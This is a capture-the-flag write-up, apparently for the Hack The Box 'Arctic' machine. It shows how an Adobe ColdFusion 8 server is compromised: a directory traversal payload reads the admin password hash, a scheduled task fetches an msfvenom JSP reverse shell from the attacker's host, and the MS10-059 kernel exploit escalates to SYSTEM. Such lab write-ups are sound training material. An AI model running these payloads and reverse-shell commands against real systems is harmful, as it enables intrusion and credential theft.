noticed a web server running on port `8500`, opening it on a browser we got to see to dirs.

navigating to the first dir, got to see some hidden dirs. let's check out the `administrator` dir.

we can see the administrator page is running an `Adobe cold fussion 8` service. let's check for exploits.

with a little research, found out that it is vuln to a `Directory Traversal` attack. [exploit](https://www.exploit-db.com/exploits/14641).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eba38a7d-5d9c-4b50-ac2d-2d8f6cc7a395)

using payload `/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` we're able to read the password hash of this service. let's crack this hash.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/090e82e0-2224-452b-802e-e8a22a677aa7)

using an online hash cracker, we are able to crack the hash. `happyday`. let's login using this password.

cool we're in the administrator panel, let's play around and find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b1c6b682-a440-4b45-88a3-143766222ec4)

navigate to the task schedule button and click schedule new task button.

```
â”Œâ”€â”€(n16hth4wkðŸ‘½n16hth4wk-sec)-[~/Documents/HTB/Artic]
â””â”€$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=445 -f raw -o shell.jsp
Payload size: 1496 bytes
Saved as: shell.jsp
```
first we generate a jsp reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0feb9ac2-e596-4183-96f5-e2e6197440b1)

add a new task, set up a python listener, so it will download the shell and output it to the dir `C:\ColdFusion8\wwwroot\CFIDE\shell.jsp`. click on submit

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/89043d60-36f0-415b-abc3-e2b66670c687)

fire up ncat listener and hit the run button. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9616bf24-762e-499f-a1c4-568f4a8efe25)

now let's navigat to the uploaded payload so it will trigger a reverse shell.

```
â”Œâ”€â”€(n16hth4wkðŸ‘½n16hth4wk-sec)-[~/Documents/HTB/Artic]
â””â”€$ ncat -lnvp 445                                                                 
Ncat: Version 7.93 ( https://nmap.org/ncat )

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

```
check back ncat listener and Boom we got reverse shell as `arctic\tolis`

first check `systeminfo`, copy the output of systeminfo into a file and save it.

ran windows-exploit-suggester found [here](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). we can see so many kernel exploit we can use. let's use `MS10-059`. which you can find [windows-exploit](https://github.com/ASR511-OO7/windows-kernel-exploits/tree/master/MS10-059).

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b45d36f7-d1fc-4e37-af71-dba22159e491)

Download the exe file, and send to the target.

ran the exploit and boom got a reverse shell as `nt authority\system`
